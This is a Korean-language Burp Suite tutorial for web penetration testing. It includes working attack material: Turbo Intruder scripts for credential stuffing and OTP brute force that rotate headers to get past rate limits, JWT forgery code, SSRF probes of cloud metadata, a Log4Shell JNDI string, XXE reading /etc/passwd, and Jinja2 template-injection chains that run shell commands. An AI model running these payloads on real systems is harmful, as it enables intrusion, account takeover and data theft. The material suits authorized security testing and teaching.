# Burp Suite 실전 완전 정복

## Burp Suite 아키텍처 이해

```
브라우저 ──► Proxy (8080) ──► Target 서버
              │
        Burp Suite
        ├── Proxy      ← HTTP 인터셉트/수정
        ├── Scanner    ← 자동 취약점 탐지 (Pro)
        ├── Intruder   ← 자동화 공격
        ├── Repeater   ← 수동 요청 반복
        ├── Decoder    ← 인코딩/디코딩
        ├── Comparer   ← 응답 비교
        ├── Logger     ← 전체 트래픽 로그
        └── Extender   ← 플러그인 관리
```

---

## 1. Proxy 고급 설정

### 인터셉트 필터 규칙

```
Proxy → Intercept → And URL Is In Target Scope
→ 범위 밖 트래픽은 자동 통과, 범위 내만 인터셉트
```

**Proxy 히스토리 필터링:**
```
Filter: Show only in-scope items
Filter: Show only parameterized requests
Filter: Hide CSS, image, general binary
```

### 매치 & 리플레이스 (자동 헤더 주입)

```
Proxy → Options → Match and Replace
→ Add:
  Type: Request Header
  Match: ^
  Replace: X-Forwarded-For: 127.0.0.1

→ Add:
  Type: Request Header  
  Match: ^
  Replace: X-Custom-IP-Authorization: 127.0.0.1
```

### TLS 패스스루 예외 설정

```
Proxy → Options → TLS Pass Through
→ 핀닝된 앱 도메인 추가 (ex: pinned.example.com)
```

---

## 2. Intruder 완전 정복

### 공격 유형 선택 가이드

| 유형 | 동작 | 사용 시나리오 |
|------|------|--------------|
| **Sniper** | 단일 페이로드 셋, 마커 순차 | 단일 파라미터 퍼징 |
| **Battering Ram** | 동일 페이로드 모든 마커 동시 | username=admin&password=admin |
| **Pitchfork** | 여러 페이로드 셋 병렬 | credential stuffing |
| **Cluster Bomb** | 모든 조합 생성 | 패스워드 브루트포스 |

### Cluster Bomb 자격증명 공격

```
Position 설정:
POST /login HTTP/1.1
...
username=§admin§&password=§password§

Payload set 1: 유저명 리스트
Payload set 2: 패스워드 리스트

Options → Grep - Match:
  "Invalid credentials" → 실패
  "Welcome" → 성공

Options → Attack Results:
  Status code 302 → 성공 판단
```

### Intruder 속도 제한 우회

```
Options → Request Engine:
  Number of threads: 1
  Number of retries: 3
  Pause before retry: 2000ms
  Throttle: 1000ms (요청 간 1초 딜레이)

→ Rate limiting 우회용 헤더 추가:
  X-Forwarded-For: §ip§  (IP 로테이션)
```

### 자동 페이로드 처리 (Payload Processing)

```
Intruder → Payloads → Payload Processing → Add
1. Hash: MD5  (패스워드를 MD5로 해싱 후 전송)
2. Encode: URL encode all characters
3. Add prefix: admin_
4. Add suffix: @company.com
```

---

## 3. Repeater 고급 활용

### 요청 탭 관리

```bash
# 단축키
Ctrl+R    → Repeater로 전송
Ctrl+U    → URL 디코딩
Ctrl+Shift+U → URL 인코딩
Ctrl+H    → HTML 디코딩

# 다중 탭 비교 워크플로
탭1: 정상 요청 (기준선)
탭2: IDOR 테스트 (다른 user_id)
탭3: Auth bypass 시도
```

### GraphQL 테스트

```graphql
# Introspection Query (스키마 추출)
POST /graphql
{
  "query": "{ __schema { types { name fields { name } } } }"
}

# 필드 발견 후 민감 데이터 쿼리
{
  "query": "{ user(id: 2) { email password ssn creditCard } }"
}

# GraphQL 인젝션
{
  "query": "{ user(id: \"1; DROP TABLE users--\") { name } }"
}
```

---

## 4. Burp Scanner (Pro) 핵심 설정

### 스캔 설정 최적화

```
Scanner → Scan Configuration → New:

Crawl:
  Max crawl depth: 10
  Max unique locations: 5000
  Application login: [크리덴셜 설정]

Audit:
  Audit speed: Thorough
  Issues reported: All issues
  
  Issue types (체크):
  ✓ SQL injection
  ✓ XSS (stored, reflected, DOM)
  ✓ OS command injection
  ✓ SSRF
  ✓ XXE
  ✓ Path traversal
  ✓ IDOR (via Scan checks)
  ✓ Open redirect
```

### 활성 스캔 vs 수동 스캔

```
활성 스캔 (Active): 실제 공격 페이로드 전송 → 허가된 환경에서만
수동 스캔 (Passive): 트래픽 분석만 → 항상 안전

수동 스캔만 수행:
Scanner → Scanner → Passive scanning only 체크
```

---

## 5. 핵심 Burp Suite 확장 도구

### Autorize (IDOR 자동 탐지)

```
설치: BApp Store → Autorize

설정:
1. 낮은 권한 계정으로 로그인
2. 쿠키/토큰을 Autorize에 붙여넣기
3. 높은 권한 계정으로 브라우징
4. Autorize가 각 요청을 낮은 권한으로 재전송

결과:
  빨간색 (Bypassed!) → IDOR 취약점 발견
  노란색 (Is enforced?) → 수동 확인 필요
  초록색 (Is enforced!) → 정상적인 권한 제어

필터:
  Filter: Interception filters
  Show only: Bypassed (IDOR만 표시)
```

### Param Miner (숨겨진 파라미터 발견)

```
설치: BApp Store → Param Miner

우클릭 → Extensions → Param Miner → Guess params
→ 자동으로 수천 개 파라미터 이름 시도

발견 예시:
  ?debug=true → 디버그 모드 활성화
  ?admin=1 → 관리자 권한 획득
  ?beta=true → 미공개 기능 접근
  ?internal=true → 내부 API 엔드포인트

Options:
  Guess headers: ON (헤더도 퍼징)
  Guess cookies: ON
  Add FCBZcache buster: ON (캐시 무효화)
```

### Turbo Intruder (고속 요청)

```python
# race_condition.py - Turbo Intruder 스크립트
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=50,
                          requestsPerConnection=100,
                          pipeline=False)
    
    # 레이스 컨디션 테스트: 동시에 100개 요청
    for i in range(100):
        engine.queue(target.req, str(i))
    
    engine.start(timeout=10)

def handleResponse(req, interesting):
    # 200 OK 응답 모두 표시
    if req.status == 200:
        table.add(req)
```

```python
# credential_stuffing.py - 대량 크리덴셜 스터핑
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=5,
                          requestsPerConnection=1,
                          pipeline=False)
    
    for cred in open('/tmp/credentials.txt'):
        user, password = cred.strip().split(':')
        engine.queue(target.req, [user, password])

def handleResponse(req, interesting):
    if 'Welcome' in req.response or req.status == 302:
        table.add(req)
        print(f"[+] Valid: {req.payload[0]}:{req.payload[1]}")
```

### Logger++ (고급 로깅)

```
설치: BApp Store → Logger++

기능:
  - 모든 HTTP 요청/응답 저장
  - 고급 필터 (Grep 패턴 매칭)
  - 자동 저장 (세션 종료 후에도 유지)
  - 응답 시간 측정 (Time-based SQLi 탐지)

필터 예시:
  Response.Body CONTAINS "error"
  Response.Body CONTAINS "SQL"
  Response.Time > 5000  (5초 이상 지연 → Time-based SQLi)
```

### Active Scan++ (확장 스캔)

```
설치: BApp Store → ActiveScan++

추가 탐지 항목:
  - SSRF via Collaborator
  - Blind XSS (XSS Hunter 통합)
  - JWT 취약점
  - XXE via file upload
  - Cache poisoning
  - HTTP request smuggling (기본 탐지)
```

---

## 6. Burp Collaborator 활용 (OOB 취약점)

### Collaborator 서버 설정

```
Burp → Project Options → Misc → Burp Collaborator Server:
  Use the default Collaborator server (Burp Cloud)
  OR
  Use a private Collaborator server: your-collab.com
```

### DNS/HTTP 콜백을 이용한 Blind 취약점 탐지

```bash
# SSRF 테스트
GET /fetch?url=http://burpcollaborator.net/ssrf-test

# Blind XSS 테스트  
"><script src="//burpcollaborator.net/xss"></script>

# XXE OOB 탐지
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://burpcollaborator.net/xxe">
]>
<data>&xxe;</data>

# Log4Shell 탐지
${jndi:ldap://burpcollaborator.net/log4shell}
```

### SSRF to Internal Network

```bash
# Burp Collaborator로 SSRF 확인 후 내부 IP 스캔
GET /proxy?url=http://192.168.1.1/  → 내부 라우터
GET /proxy?url=http://169.254.169.254/latest/meta-data/  → AWS 메타데이터
GET /proxy?url=http://10.0.0.1:8080/  → 내부 서비스

# 응답으로 내부 네트워크 매핑
for ip in 192.168.1.{1..254}:
    GET /proxy?url=http://{ip}/
```

---

## 7. JWT 공격 실습

### JWT 구조 분석

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4ifQ.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

헤더.페이로드.서명

헤더: {"alg":"HS256","typ":"JWT"}
페이로드: {"sub":"1234","name":"John","role":"user"}
서명: HMAC-SHA256(헤더+페이로드, 비밀키)
```

### JWT 공격 기법

```python
import jwt
import base64
import json

# 1. alg:none 공격
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "1234", "role": "admin"}

# 서명 없이 토큰 생성
token = base64.b64encode(json.dumps(header).encode()).decode() + "." + \
        base64.b64encode(json.dumps(payload).encode()).decode() + "."

# 2. RS256 → HS256 알고리즘 혼동
# 서버의 공개키(RSA)를 HMAC 비밀키로 사용
with open('public_key.pem', 'r') as f:
    public_key = f.read()

# HS256으로 공개키로 서명
token = jwt.encode({"sub": "1", "role": "admin"}, 
                   public_key, 
                   algorithm="HS256")

# 3. 약한 비밀키 브루트포스
# hashcat -a 0 -m 16500 jwt_token.txt wordlist.txt
```

```bash
# jwt_tool 사용법
pip install jwt_tool
python3 jwt_tool.py [TOKEN] -T        # 변조 모드
python3 jwt_tool.py [TOKEN] -X a      # alg:none 공격
python3 jwt_tool.py [TOKEN] -X s      # 서명 혼동 공격
python3 jwt_tool.py [TOKEN] -C -d wordlist.txt  # 비밀키 크랙
```

---

## 8. HTTP Request Smuggling

### CL.TE 스머글링 (Content-Length + Transfer-Encoding)

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL 스머글링

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

### Burp로 스머글링 탐지

```
HTTP Request Smuggler 확장 설치
우클릭 → Extensions → HTTP Request Smuggler → Smuggle probe

자동으로 CL.TE, TE.CL, TE.TE 테스트
```

---

## 9. WebSocket 테스트

```
Proxy → WebSockets history → 모든 WS 메시지 캡처

인터셉트 활성화:
Proxy → Options → Intercept WebSockets messages

Repeater로 전송:
우클릭 → Send to Repeater

WebSocket 메시지 변조:
{"action":"getUser","id":"1"} → {"action":"getUser","id":"2"}
```

---

## 10. 실전 버그 발견 체크리스트

```
□ 모든 파라미터에 XSS 페이로드: <script>alert(1)</script>
□ 숫자형 파라미터 IDOR: id=1 → id=2, id=0, id=-1
□ 파일 업로드: .php, .jsp, .aspx 확장자 시도
□ 리다이렉트 파라미터: redirect=javascript:alert(1)
□ Host 헤더 변조: Host: evil.com (캐시 포이즈닝)
□ X-Forwarded-Host: evil.com (비밀번호 리셋 링크 변조)
□ Content-Type 변경: JSON → XML → XXE 시도
□ HTTP 메서드: GET→POST, POST→PUT, 임의 메서드
□ API 버전: /v1/ → /v2/, /api/v1/ → /api/
□ 경로 순회: ../../../etc/passwd
□ SQLi: ', ", 1=1--, SLEEP(5)
□ SSTI: {{7*7}}, ${7*7}, <%= 7*7 %>
□ NoSQLi: {"$gt": ""}, {"$where": "sleep(5000)"}
□ LDAP Injection: *)(|(uid=*
□ XXE: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
□ Deserialization: Java/PHP 직렬화 데이터에 악성 객체 삽입
□ Clickjacking: X-Frame-Options 헤더 미설정 확인
□ CORS: Origin: evil.com → Access-Control-Allow-Origin 반응 확인
```

---

## 11-2. Burp Suite로 Open Redirect 탐지

### Open Redirect 개요 및 탐지
```
Open Redirect:
  서버가 사용자 제공 URL로 리다이렉트 시
  공격자가 피싱 사이트로 유도 가능

취약한 패턴:
  /redirect?url=https://attacker.com
  /login?next=https://attacker.com
  /logout?returnTo=//attacker.com  (프로토콜 상대 URL)
  /go?link=javascript:alert(1)     (XSS 연계)
```

```bash
# Open Redirect 탐지 페이로드
https://target.com/redirect?url=https://evil.com
https://target.com/redirect?url=//evil.com         (프로토콜 생략)
https://target.com/redirect?url=https:evil.com
https://target.com/redirect?url=\evil.com          (백슬래시)
https://target.com/redirect?url=https://target.com@evil.com  (@ 오파싱)
https://target.com/redirect?url=https://evil.com%2F%2Ftarget.com

# Burp Intruder + 페이로드 목록으로 자동화
# redirect 관련 파라미터: url, next, returnTo, go, link, redirect, redir, r, ret

# gau + Open Redirect 파이프라인
gau target.com | grep -E "redirect|next|url|returnTo|go=" | \
  while read url; do
    curl -I -L "$url" 2>/dev/null | grep "Location:" | grep -v "target.com"
  done
```

### Rate Limiting 취약점 탐지
```
Rate Limiting 미적용 시 가능한 공격:
  - 로그인 브루트포스
  - OTP/인증 코드 브루트포스
  - API 대량 요청 (크레딧 소진, 서비스 남용)

탐지 방법:
  Burp Suite Intruder → 동일 요청 100회 반복
  → 응답 코드가 계속 200이면 Rate Limiting 없음
  → 429 Too Many Requests: Rate Limiting 적용됨
  → X-RateLimit-Limit, X-RateLimit-Remaining 헤더 확인

우회 기법:
  - X-Forwarded-For: 1.2.3.4 (매 요청마다 변경)
  - X-Real-IP: 1.2.3.4
  - X-Originating-IP: 1.2.3.4
  → 서버가 이 헤더를 신뢰하면 IP Rate Limit 우회 가능
```

```python
# Turbo Intruder로 Rate Limit 우회 테스트
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=1)
    
    for i, otp in enumerate(range(100000, 999999)):
        # X-Forwarded-For 매 요청마다 변경
        req = target.req.replace('X-Forwarded-For: 1.1.1.1', 
                                  f'X-Forwarded-For: 192.168.{i//255}.{i%255}')
        engine.queue(req, str(otp).zfill(6))

def handleResponse(req, interesting):
    if 'invalid' not in req.response.lower():
        table.add(req)
```

---

## 12. SSTI (Server-Side Template Injection) 탐지

### 템플릿 엔진별 탐지 페이로드
```
탐지 순서: 모든 사용자 입력 파라미터에 수학 표현식 삽입
→ 서버가 계산 결과를 반환하면 SSTI 취약점 존재

Jinja2 (Python/Flask):
  {{7*7}}          → 49  (기본 탐지)
  {{7*'7'}}        → 7777777  (Jinja2 특징적 결과)
  {{config}}       → 앱 설정 노출
  {{request.environ}}  → 환경변수
  
Twig (PHP):
  {{7*7}}          → 49
  {{7*'7'}}        → 49 (PHP 특징 — 문자열 자동 숫자 변환)

FreeMarker (Java):
  ${7*7}           → 49
  <#assign>        → 변수 할당
  
Velocity (Java):
  #set($x=7*7)${x} → 49
  
ERB (Ruby):
  <%= 7*7 %>       → 49
  
Smarty (PHP):
  {7*7}            → 49
  {php}system('id'){/php}  → RCE (Smarty2)
  
Mako (Python):
  ${7*7}           → 49
  <%! import os %>
```

### SSTI → RCE 익스플로잇 (Jinja2)
```python
# Jinja2 RCE — Python 내장 함수 체인
{{''.__class__.__mro__[1].__subclasses__()}}
# → Python의 모든 클래스 목록 출력

# subprocess.Popen 찾아서 실행
{{''.__class__.__mro__[1].__subclasses__()[x]('id',shell=True,stdout=-1).communicate()}}

# 간단한 RCE (필터링 없을 때)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# request 객체 악용
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Burp Suite로 SSTI 탐지 자동화
```
1. Intruder → Sniper 모드
2. 모든 파라미터에 § 마킹
3. 페이로드: {{7*7}}, ${7*7}, #{7*7}, *{7*7}, <%= 7*7 %>
4. Grep Match: "49" 응답 필터링
5. 매칭된 파라미터 → Repeater에서 심화 분석

Param Miner와 연계:
- Param Miner가 발견한 숨겨진 파라미터에도 SSTI 시도
- 특히 template, view, page, render 같은 이름의 파라미터 우선
```

---

## 11. Burp Suite 성능 최적화

```
Project Options → Connections:
  Hostname resolution: Use platform default
  Timeouts: 10s (줄이기)
  Retry on failure: OFF (속도)

User Options → Performance:
  Java heap: 2048MB 이상 (jvm_args -Xmx2g)
  
  실행 시:
  java -jar -Xmx2g burpsuite_pro.jar
```

```bash
# Burp 시작 스크립트
#!/bin/bash
BURP_PATH="/opt/BurpSuitePro/burpsuite_pro.jar"
java \
  -jar $BURP_PATH \
  -Xmx2g \
  -Djava.awt.headless=false \
  --unpause-spider-and-scanner \
  2>/dev/null &
```
